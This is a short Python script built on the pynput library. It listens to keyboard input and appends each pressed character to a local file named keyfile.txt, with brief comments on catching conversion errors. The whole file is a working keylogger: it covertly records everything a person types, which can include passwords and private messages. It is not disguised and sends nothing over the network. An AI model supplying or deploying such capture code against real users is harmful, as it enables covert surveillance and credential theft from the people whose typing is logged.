from pynput import keyboard

def keyPressed(key): #on_pass automatically requires the (key)
  print(str(key))
  with open("keyfile.txt", 'a') as logKey:
    try: #this method doesn't always work properly, hence the try/except
      char = key.char #convert to characters
      logKey.write(char)
    except:
      print("Error getting character")

if __name__ == "__main__":
  listener = keyboard.Listener(on_press=keyPressed)
  listener.start()
  input()